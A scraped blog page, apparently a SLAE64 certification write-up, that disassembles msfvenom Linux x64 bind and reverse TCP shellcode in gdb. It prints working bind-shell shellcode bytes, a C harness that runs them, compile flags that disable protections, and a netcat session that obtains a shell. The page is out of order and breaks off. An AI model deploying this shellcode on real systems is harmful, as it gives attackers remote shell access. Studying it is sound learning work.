0x000055555555807e \u003c+30\u003e: (bad) 0x000055555555807f \u003c+31\u003e: ins DWORD PTR es:[rdi],dx 0x0000555555558080 \u003c+32\u003e: imul eax,DWORD PTR [rax],0x5e545756 The call isntruction does the magic here. It pushes onto the top of the stack the next address. In pratical terms, the bytes of the next isntruction are pushed onto the stack and the CPU will read those bytes until finds a null.\nif we examine the address of ja 0x5555555580e5, we verify the command whoami is right there.\ngef➤ x/s 0x000055555555807b 0x55555555807b : \"whoami\" Everything set, call execve! Let’s check how the stack and the registers are set before the interruption syscall.\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n",
  "wordCount" : "2615",
  "inLanguage": "en",
  "datePublished": "2023-01-01T17:58:44Z",
  "dateModified": "2023-01-01T17:58:44Z",
  "author":{
    "@type": "Person",
    "name": "nibbles"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_5/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nibbles",
    "logo": {
      "@type": "ImageObject",
      "url": "https://0xnibbles.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://0xnibbles.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/about.html" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      SLAE64 Assignment 5 - Msfvenom Shellcode Analysis 
    </h1>
    <div class="post-meta"><span title='2023-01-01 17:58:44 +0000 UTC'>January 1, 2023</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;nibbles

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#introduction" aria-label="Introduction">Introduction</a><ul>
                        
                <li>
                    <a href="#shellcode-1---linuxx64shell_bind_tcp" aria-label="Shellcode 1 - linux/x64/shell_bind_tcp">Shellcode 1 - linux/x64/shell_bind_tcp</a><ul>
                        
                <li>
                    <a href="#compile-and-testing-the-shellcode" aria-label="Compile and Testing the Shellcode">Compile and Testing the Shellcode</a></li>
                <li>
                    <a href="#gdb-analysis" aria-label="GDB Analysis">GDB Analysis</a><ul>
                        
                <li>
                    <a href="#disassembling-bind-tcp-shellcode" aria-label="Disassembling Bind TCP Shellcode">Disassembling Bind TCP Shellcode</a><ul>
                        
                <li>
                    <a href="#socket-syscall" aria-label="Socket Syscall">Socket Syscall</a></li>
                <li>
                    <a href="#bind-syscall" aria-label="Bind Syscall">Bind Syscall</a></li>
                <li>
                    <a href="#listen-syscall" aria-label="Listen Syscall">Listen Syscall</a></li>
                <li>
                    <a href="#accept-syscall" aria-label="Accept Syscall">Accept Syscall</a></li>
                <li>
                    <a href="#dup2-syscall-loop" aria-label="Dup2 Syscall Loop">Dup2 Syscall Loop</a></li>
                <li>
                    <a href="#execve-syscall" aria-label="Execve Syscall">Execve Syscall</a></li></ul>
                </li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#shellcode-2---linuxx64shell_reverse_tcp" aria-label="Shellcode 2 - linux/x64/shell_reverse_tcp">Shellcode 2 - linux/x64/shell_reverse_tcp</a><ul>
                        
                <li>
                    <a href="#compile-and-testing-the-shellcode-1" aria-label="Compile and Testing the Shellcode">Compile and Testing the Shellcode</a></li>
                <li>
                    <a href="#gdb-analysis-1" aria-label="GDB Analysis">GDB Analysis</a><ul>
                        
                <li>
                    <a href="#disassembling-reverse-tcp-shellcode" aria-label="Disassembling Reverse TCP Shellcode">Disassembling Reverse TCP Shellcode</a><ul>
                        
                <li>
                    <a href="#socket-syscall-1" aria-label="Socket Syscall">Socket Syscall</a></li>
                <li>
                    <a href="#connect-syscall" aria-label="Connect Syscall">Connect Syscall</a></li>
                <li>
                    <a href="#dup2-syscall-loop-1" aria-label="Dup2 Syscall Loop">Dup2 Syscall Loop</a></li>
                <li>
                    <a href="#execve-syscall-1" aria-label="Execve Syscall">Execve Syscall</a></li></ul>
                </li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#shellcode-3---linuxx64exec" aria-label="Shellcode 3 - linux/x64/exec">Shellcode 3 - linux/x64/exec</a></li>
                <li>
                    <a href="#compile-and-testing-the-shellcode-2" aria-label="Compile and Testing the Shellcode">Compile and Testing the Shellcode</a><ul>
                        
                <li>
                    <a href="#gdb-analysis-2" aria-label="GDB Analysis">GDB Analysis</a><ul>
                        
                <li>
                    <a href="#disassembling-reverse-tcp-shellcode-1" aria-label="Disassembling Reverse TCP Shellcode">Disassembling Reverse TCP Shellcode</a></li>
                <li>
                    <a href="#disassembling-reverse-tcp-shellcode-2" aria-label="Disassembling Reverse TCP Shellcode">Disassembling Reverse TCP Shellcode</a></li>
                <li>
                    <a href="#binsh-push-push-and-push-to-the-stack" aria-label="/bin/sh? Push, push and push to the stack!">/bin/sh? Push, push and push to the stack!</a></li>
                <li>
                    <a href="#command-flag--c" aria-label="Command Flag (-c)">Command Flag (-c)</a></li>
                <li>
                    <a href="#obfudcated-call-push-pop-syscall-calling-execve-in-a-different-way" aria-label="Obfudcated &amp;ldquo;Call-Push-Pop&amp;rdquo; Syscall? Calling execve in a different way">Obfudcated &ldquo;Call-Push-Pop&rdquo; Syscall? Calling execve in a different way</a><ul>
                        
                <li>
                    <a href="#the-execves-command" aria-label="The execve&amp;rsquo;s Command">The execve&rsquo;s Command</a></li>
                <li>
                    <a href="#everything-set-call-execve" aria-label="Everything set, call execve!">Everything set, call execve!</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img loading="lazy" src="/slae64/slae64.png#center" alt="SLAE64"  title="SLAE64"  />
</p>
<p>This post introduces my 5th mission to my SLAE64 journey.</p>
<h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
<p>The SLAE64 5th assignment purpose is to select 3 msfvenom payloads dissect them with <code>gdb</code> and document my own analysis of them.</p>
<p>For this task I selected the following payloads:</p>
<ul>
<li>linux/x86/shell_bind_tcp</li>
<li>linux/x86/shell_reverse_tcp</li>
<li>linux/x86/chmod</li>
</ul>
<h2 id="shellcode-1---linuxx64shell_bind_tcp">Shellcode 1 - linux/x64/shell_bind_tcp<a hidden class="anchor" aria-hidden="true" href="#shellcode-1---linuxx64shell_bind_tcp">#</a></h2>
<hr>
<p>The first step to do is generate the shellcode using MSF. As usual, let&rsquo;s check its arguments</p>
<p><code>msfvenom -p linux/x64/shell_bind_tcp --list-options</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x64/shell_bind_tcp --list-options
</span></span><span style="display:flex;"><span>Options <span style="color:#66d9ef">for</span> payload/linux/x64/shell_bind_tcp:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name: Linux Command Shell, Bind TCP Inline
</span></span><span style="display:flex;"><span>     Module: payload/linux/x64/shell_bind_tcp
</span></span><span style="display:flex;"><span>   Platform: Linux
</span></span><span style="display:flex;"><span>       Arch: x64
</span></span><span style="display:flex;"><span>Needs Admin: No
</span></span><span style="display:flex;"><span> Total size: <span style="color:#ae81ff">86</span>
</span></span><span style="display:flex;"><span>       Rank: Normal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Provided by:
</span></span><span style="display:flex;"><span>    ricky
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Basic options:
</span></span><span style="display:flex;"><span>Name   Current Setting  Required  Description
</span></span><span style="display:flex;"><span>----   ---------------  --------  -----------
</span></span><span style="display:flex;"><span>LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
</span></span><span style="display:flex;"><span>RHOST                   no        The target address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Description:
</span></span><span style="display:flex;"><span>  Listen <span style="color:#66d9ef">for</span> a connection and spawn a command shell
</span></span></code></pre></div><p>Let&rsquo;s get our bind shell using <code>msfvenom</code>. The command below will by default point to 127.0.0.1 and port 4444.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x64/shell_bind_tcp -f c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">86</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">389</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0f\x05&#34;</span>;
</span></span></code></pre></div><h3 id="compile-and-testing-the-shellcode">Compile and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compile-and-testing-the-shellcode">#</a></h3>
<p>Adding the shellcode to our tester program - <code>shellcode.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ret</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ nc -nv 127.0.0.1 <span style="color:#ae81ff">4444</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>
</span></span></code></pre></div><h3 id="gdb-analysis">GDB Analysis<a hidden class="anchor" aria-hidden="true" href="#gdb-analysis">#</a></h3>
<p>For this analysis I used <a href="https://github.com/hugsy/gef">GEF</a> plugin to assist my analysis with <code>GDB</code>.</p>
<pre tabindex="0"><code>gdb -q ./shellcode
</code></pre><p>First, we put a breakpoint in <code>code[]</code> to pause the execution at the beggining of the shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gdb -q ./shellcode
</span></span><span style="display:flex;"><span>GEF <span style="color:#66d9ef">for</span> linux ready, type <span style="color:#e6db74">`</span>gef<span style="color:#e6db74">&#39; to start, `gef config&#39;</span> to configure
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span> commands loaded <span style="color:#66d9ef">for</span> GDB 8.2.1 using Python engine 3.7
</span></span><span style="display:flex;"><span>gef➤  b *&amp;code
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x4040
</span></span><span style="display:flex;"><span>gef➤  r
</span></span></code></pre></div><p>We go direct to the shellcode&rsquo;s first instruction.</p>
<h4 id="disassembling-bind-tcp-shellcode">Disassembling Bind TCP Shellcode<a hidden class="anchor" aria-hidden="true" href="#disassembling-bind-tcp-shellcode">#</a></h4>
<p>With the isntruction <code>disas</code> we can disassemble the <code>code</code> function. In our context is the Bind Shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>gef➤  disas
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> code:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span>&gt; 0x0000555555558040 &lt;+0&gt;:     push   0x29
</span></span><span style="display:flex;"><span>   0x0000555555558042 &lt;+2&gt;:     pop    rax
</span></span><span style="display:flex;"><span>   0x0000555555558043 &lt;+3&gt;:     cdq    
</span></span><span style="display:flex;"><span>   0x0000555555558044 &lt;+4&gt;:     push   0x2
</span></span><span style="display:flex;"><span>   0x0000555555558046 &lt;+6&gt;:     pop    rdi
</span></span><span style="display:flex;"><span>   0x0000555555558047 &lt;+7&gt;:     push   0x1
</span></span><span style="display:flex;"><span>   0x0000555555558049 &lt;+9&gt;:     pop    rsi
</span></span><span style="display:flex;"><span>   0x000055555555804a &lt;+10&gt;:    syscall 
</span></span><span style="display:flex;"><span>   0x000055555555804c &lt;+12&gt;:    xchg   rdi,rax
</span></span><span style="display:flex;"><span>   0x000055555555804e &lt;+14&gt;:    push   rdx
</span></span><span style="display:flex;"><span>   0x000055555555804f &lt;+15&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>rsp<span style="color:#f92672">]</span>,0x5c110002
</span></span><span style="display:flex;"><span>   0x0000555555558056 &lt;+22&gt;:    mov    rsi,rsp
</span></span><span style="display:flex;"><span>   0x0000555555558059 &lt;+25&gt;:    push   0x10
</span></span><span style="display:flex;"><span>   0x000055555555805b &lt;+27&gt;:    pop    rdx
</span></span><span style="display:flex;"><span>   0x000055555555805c &lt;+28&gt;:    push   0x31
</span></span><span style="display:flex;"><span>   0x000055555555805e &lt;+30&gt;:    pop    rax
</span></span><span style="display:flex;"><span>   0x000055555555805f &lt;+31&gt;:    syscall 
</span></span><span style="display:flex;"><span>   0x0000555555558061 &lt;+33&gt;:    push   0x32
</span></span><span style="display:flex;"><span>   0x0000555555558063 &lt;+35&gt;:    pop    rax
</span></span><span style="display:flex;"><span>   0x0000555555558064 &lt;+36&gt;:    syscall 
</span></span><span style="display:flex;"><span>   0x0000555555558066 &lt;+38&gt;:    xor    rsi,rsi
</span></span><span style="display:flex;"><span>   0x0000555555558069 &lt;+41&gt;:    push   0x2b
</span></span><span style="display:flex;"><span>   0x000055555555806b &lt;+43&gt;:    pop    rax
</span></span><span style="display:flex;"><span>   0x000055555555806c &lt;+44&gt;:    syscall 
</span></span><span style="display:flex;"><span>   0x000055555555806e &lt;+46&gt;:    xchg   rdi,rax
</span></span><span style="display:flex;"><span>   0x0000555555558070 &lt;+48&gt;:    push   0x3
</span></span><span style="display:flex;"><span>   0x0000555555558072 &lt;+50&gt;:    pop    rsi
</span></span><span style="display:flex;"><span>   0x0000555555558073 &lt;+51&gt;:    dec    rsi
</span></span><span style="display:flex;"><span>   0x0000555555558076 &lt;+54&gt;:    push   0x21
</span></span><span style="display:flex;"><span>   0x0000555555558078 &lt;+56&gt;:    pop    rax
</span></span><span style="display:flex;"><span>   0x0000555555558079 &lt;+57&gt;:    syscall 
</span></span><span style="display:flex;"><span>   0x000055555555807b &lt;+59&gt;:    jne    0x555555558073 &lt;code+51&gt;
</span></span><span style="display:flex;"><span>   0x000055555555807d &lt;+61&gt;:    push   0x3b
</span></span><span style="display:flex;"><span>   0x000055555555807f &lt;+63&gt;:    pop    rax
</span></span><span style="display:flex;"><span>   0x0000555555558080 &lt;+64&gt;:    cdq    
</span></span><span style="display:flex;"><span>   0x0000555555558081 &lt;+65&gt;:    movabs rbx,0x68732f6e69622f
</span></span><span style="display:flex;"><span>   0x000055555555808b &lt;+75&gt;:    push   rbx
</span></span><span style="display:flex;"><span>   0x000055555555808c &lt;+76&gt;:    mov    rdi,rsp
</span></span><span style="display:flex;"><span>   0x000055555555808f &lt;+79&gt;:    push   rdx
</span></span><span style="display:flex;"><span>   0x0000555555558090 &lt;+80&gt;:    push   rdi
</span></span><span style="display:flex;"><span>   0x0000555555558091 &lt;+81&gt;:    mov    rsi,rsp
</span></span><span style="display:flex;"><span>   0x0000555555558094 &lt;+84&gt;:    syscall 
</span></span><span style="display:flex;"><span>End of assembler dump.
</span></span></code></pre></div><h5 id="socket-syscall">Socket Syscall<a hidden class="anchor" aria-hidden="true" href="#socket-syscall">#</a></h5>
<pre tabindex="0"><code>0x0000555555558040 &lt;+0&gt;:     push   0x29
0x0000555555558042 &lt;+2&gt;:     pop    rax
0x0000555555558043 &lt;+3&gt;:     cdq    
0x0000555555558044 &lt;+4&gt;:     push   0x2
0x0000555555558046 &lt;+6&gt;:     pop    rdi
0x0000555555558047 &lt;+7&gt;:     push   0x1
0x0000555555558049 &lt;+9&gt;:     pop    rsi
0x000055555555804a &lt;+10&gt;:    syscall 
</code></pre><ul>
<li>
<p><code>rax</code> is set to <code>0x29</code> which is the <code>socket</code> syscall number.</p>
</li>
<li>
<p><code>cdq</code> is for clearing <code>rdx</code>.</p>
</li>
<li>
<p><code>rdi</code> is set to 0x2 which is <code>AF_INET</code>.</p>
</li>
<li>
<p><code>rsi</code> is set to 0x1 which is SOCK_STREAM</p>
</li>
</ul>
<h5 id="bind-syscall">Bind Syscall<a hidden class="anchor" aria-hidden="true" href="#bind-syscall">#</a></h5>
<pre tabindex="0"><code>0x000055555555804c &lt;+12&gt;:    xchg   rdi,rax ; stores socket file descriptor in rdi
0x000055555555804e &lt;+14&gt;:    push   rdx     ; rdx is null
0x000055555555804f &lt;+15&gt;:    mov    DWORD PTR [rsp],0x5c110002
0x0000555555558056 &lt;+22&gt;:    mov    rsi,rsp
0x0000555555558059 &lt;+25&gt;:    push   0x10
0x000055555555805b &lt;+27&gt;:    pop    rdx
0x000055555555805c &lt;+28&gt;:    push   0x31
0x000055555555805e &lt;+30&gt;:    pop    rax
0x000055555555805f &lt;+31&gt;:    syscall
</code></pre><ul>
<li>
<p>``push rdx<code>will push 4 bytes of zeros regarding</code>IPADDR_ANY`. This means it will bind in all interfaces.</p>
</li>
<li>
<p><code>0x5c110002</code></p>
<ul>
<li>0002 is <code>AF_INET</code></li>
<li>5c11 if for PORT 4444 in Little-Endian format</li>
</ul>
</li>
</ul>
<p>Then puts 0x10 (16 bytes) in <code>rdx</code> which is the struct size</p>
<ul>
<li><code>0x31</code> is bind syscall number.</li>
</ul>
<h5 id="listen-syscall">Listen Syscall<a hidden class="anchor" aria-hidden="true" href="#listen-syscall">#</a></h5>
<p>0x0000555555558061 &lt;+33&gt;:    push   0x32
0x0000555555558063 &lt;+35&gt;:    pop    rax
0x0000555555558064 &lt;+36&gt;:    syscall</p>
<ul>
<li>
<p>Puts <code>0x32</code> in <code>rax</code>, listen syscall number</p>
</li>
<li>
<p><code>Listen</code> has a 2nd argument called <code>backlog</code> holed in <code>rsi</code> which defines the maximum length to which the queue of pending connections for sockfd may grow. This does not has a real importance for our exercise.</p>
</li>
</ul>
<h5 id="accept-syscall">Accept Syscall<a hidden class="anchor" aria-hidden="true" href="#accept-syscall">#</a></h5>
<pre tabindex="0"><code>0x0000555555558066 &lt;+38&gt;:    xor    rsi,rsi
0x0000555555558069 &lt;+41&gt;:    push   0x2b
0x000055555555806b &lt;+43&gt;:    pop    rax
0x000055555555806c &lt;+44&gt;:    syscall
</code></pre><ul>
<li>Clear <code>rsi</code> and put accpet ssycall number in <code>rax</code>.</li>
</ul>
<p>As there is no struct needed for the socket address, <code>rsi</code> and <code>rdx</code> are set to zero.</p>
<h5 id="dup2-syscall-loop">Dup2 Syscall Loop<a hidden class="anchor" aria-hidden="true" href="#dup2-syscall-loop">#</a></h5>
<pre tabindex="0"><code>0x0000555555558070 &lt;+48&gt;:    push   0x3
0x0000555555558072 &lt;+50&gt;:    pop    rsi
0x0000555555558073 &lt;+51&gt;:    dec    rsi
0x0000555555558076 &lt;+54&gt;:    push   0x21
0x0000555555558078 &lt;+56&gt;:    pop    rax
0x0000555555558079 &lt;+57&gt;:    syscall 
0x000055555555807b &lt;+59&gt;:    jne    0x555555558073 &lt;code+51&gt;
</code></pre><p>The already &ldquo;famous&rdquo; dup2 syscall loop for <code>stdin</code>, <code>stdout</code> and <code>stderr</code>.</p>
<p>Puts <code>0x21</code>, the dup2 syscall number in <code>rax</code></p>
<h5 id="execve-syscall">Execve Syscall<a hidden class="anchor" aria-hidden="true" href="#execve-syscall">#</a></h5>
<p>The syscall used to call <code>/bin/sh</code> and spawn a shell to an incoming connection.</p>
<pre tabindex="0"><code>0x000055555555807d &lt;+61&gt;:    push   0x3b
0x000055555555807f &lt;+63&gt;:    pop    rax
0x0000555555558080 &lt;+64&gt;:    cdq 
</code></pre><ul>
<li>set <code>rax</code> with execve syscall</li>
<li><code>cdq</code> clears <code>rdx</code></li>
</ul>
<pre tabindex="0"><code>0x0000555555558081 &lt;+65&gt;:    movabs rbx,0x68732f6e69622f    ; /bin/sh
0x000055555555808b &lt;+75&gt;:    push   rbx     ; push null
0x000055555555808c &lt;+76&gt;:    mov    rdi,rsp
</code></pre><ul>
<li><code>rdi</code> is set to the memory address of the null-terminated string <code>/bin/sh</code></li>
</ul>
<pre tabindex="0"><code>0x000055555555808f &lt;+79&gt;:    push   rdx     ; push null
0x0000555555558090 &lt;+80&gt;:    push   rdi     ; push memory of /bin/sh
0x0000555555558091 &lt;+81&gt;:    mov    rsi,rsp
0x0000555555558094 &lt;+84&gt;:    syscall 
</code></pre><ul>
<li><code>rsi</code> is set to a pointer of a pointer address of <code>/bin/sh</code></li>
<li>Calls execve with the <code>syscall</code> isntruction</li>
</ul>
<h2 id="shellcode-2---linuxx64shell_reverse_tcp">Shellcode 2 - linux/x64/shell_reverse_tcp<a hidden class="anchor" aria-hidden="true" href="#shellcode-2---linuxx64shell_reverse_tcp">#</a></h2>
<hr>
<p>The first step to do is generate the shellcode using MSF. As usual, let&rsquo;s check its arguments</p>
<p><code>msfvenom -p linux/x64/shell_reverse_tcp --list-options</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ msfvenom -p linux/x64/shell_reverse_tcp --list-options
</span></span><span style="display:flex;"><span>Options <span style="color:#66d9ef">for</span> payload/linux/x64/shell_reverse_tcp:
